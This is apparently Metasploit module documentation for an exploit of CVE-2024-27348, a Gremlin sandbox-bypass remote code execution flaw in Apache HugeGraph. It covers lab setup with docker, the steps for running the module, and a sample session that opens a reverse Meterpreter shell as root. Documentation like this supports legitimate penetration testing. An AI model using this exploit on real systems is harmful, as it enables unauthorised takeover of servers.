## Vulnerable Application
This module exploits CVE-2024-27348 which is a Remote Code Execution (RCE) vulnerability that exists in
Apache HugeGraph Server in versions before 1.3.0. An attacker can bypass the sandbox restrictions and achieve
RCE through Gremlin, resulting in complete control over the server

### Setup
To install a vulnerable instance via docker run the following command:
```
docker run -itd --name=graph -p 8080:8080 hugegraph/hugegraph:1.0.0
```

## Verification Steps

1. Start msfconsole
1. Do: `use exploit/linux/http/apache_hugegraph_gremlin_rce`
1. Set the `RHOST` and `LHOST` options
1. Run the module
1. Receive a Meterpreter session as the `root` user.

## Scenarios
### Apache HugeGraph 1.0.0 docker instance
```

msf6 exploit(linux/http/apache_hugegraph_gremlin_rce) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 exploit(linux/http/apache_hugegraph_gremlin_rce) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(linux/http/apache_hugegraph_gremlin_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Apache HugeGraph version detected: 1.0.0
[*] 127.0.0.1:9191 - Executing Automatic Target for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending stage (3045380 bytes) to 172.16.199.1
[*] Meterpreter session 8 opened (172.16.199.1:4444 -> 172.16.199.1:53803) at 2024-07-29 13:59:20 -0700

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 11.4 (Linux 6.6.32-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
